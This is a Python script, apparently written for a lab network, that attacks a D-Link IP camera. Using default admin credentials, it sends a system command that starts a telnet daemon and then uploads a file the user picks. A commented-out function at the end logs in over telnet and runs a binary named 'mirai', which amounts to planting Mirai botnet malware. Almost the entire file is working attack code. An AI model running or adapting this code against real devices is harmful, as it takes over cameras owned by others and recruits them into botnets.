import requests
from requests.auth import HTTPBasicAuth
import telnetlib
from time import sleep
import requests
from requests.auth import HTTPBasicAuth
import argparse

def enable_telnet(host_last_value):
    # Construct the full IP address from the passed parameter
    url = f"http://10.10.10.{host_last_value}/setSystemCommand"
    username = "admin"
    password = "1234"

    # Form data
    data = {
        "ReplySuccessPage": "home.htm",
        "ReplyErrorPage": "errradv.htm",
        "SystemCommand": "telnetd",
        "ConfigSystemCommand": "test",
    }

    # Send the POST request with Basic Authentication
    response = requests.post(
        url,
        data=data,
        auth=HTTPBasicAuth(username, password)
    )

    # Print the response
    # print("Telnet Enable Status Code:", response.status_code)
    # print("Telnet Enable Response Text:", response.text)
    return response.status_code

def upload_file_to_dlink_cam(host_last_value, file_path):
    # Construct the full IP address for file upload
    url = f"http://10.10.10.{host_last_value}/setFileUpload"
    username = "admin"
    password = "1234"

    # Form data for file upload
    data = {
        "ReplySuccessPage": "replyuf.htm",
        "ReplyErrorPage": "replyuf.htm",
        "FileName": f"/{file_path}",  # Destination path
        "ConfigUploadFile": "Upload File",
    }

    files = {
        "UploadFile": (f"{file_path}", open(file_path, "rb"), "text/plain"),
    }

    # Make the POST request with Basic Authentication to upload the file
    response = requests.post(
        url,
        data=data,
        files=files,
        auth=HTTPBasicAuth(username, password),
    )

    # Print the response
    # print("File Upload Status Code:", response.status_code)
    # print("File Upload Response Text:", response.text)
    return response.status_code

if __name__ == "__main__":
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Enable Telnet on a specific host and optionally upload a file")
    parser.add_argument("host_last_value", type=int, help="The last value of the IP address (e.g., 6 for 10.10.10.6)")

    # Parse the argument
    args = parser.parse_args()

    # Enable Telnet on the specified host
    enable_telnet(args.host_last_value)

    # Ask if the user wants to upload a file
    upload_choice = input("Do you want to upload a file? (yes/no): ").strip().lower()

    if upload_choice == "yes":
        # Ask for the file path
        file_path = input("Enter the file path to upload: ").strip()
        # Upload the file to the same host
        upload_file_to_dlink_cam(host_last_value=args.host_last_value, file_path=file_path)
    else:
        print("File upload skipped.")




# def connect_over_telnet_and_execute_cmd():
#     # Configuration
#     host = "10.10.10.6"  # Replace with the IP address of the target
#     port = 23  # Default Telnet port
#     username = "admin"  # Replace with your username
#     password = "1234"  # Replace with your password
#     command_1 = "cd media/"
#     command = "./mirai"  # Replace with the command you want to execute

#     try:
#         # Connect to the host
#         tn = telnetlib.Telnet(host, port)

#         # Read until login prompt and send the username
#         tn.read_until(b"login: ")
#         tn.write(username.encode('ascii') + b"\n")

#         # Read until password prompt and send the password
#         tn.read_until(b"Password: ")
#         tn.write(password.encode('ascii') + b"\n")

#         # # Wait for the prompt and execute the command
#         tn.read_until(b"# ")  # Adjust if the prompt is different (e.g., #, >)
        
#         tn.write(command_1.encode('ascii') + b"\n")
#         sleep(1)
#         tn.write(command.encode('ascii') + b"\n")

        

#         # Continuously read and print the output
#         while True:
#             output = tn.read_very_eager()
#             if output:
#                 print(output.decode('ascii'), end="")
#     except Exception as e:
#         print(f"Error: {e}")
#     finally:
#         tn.close()

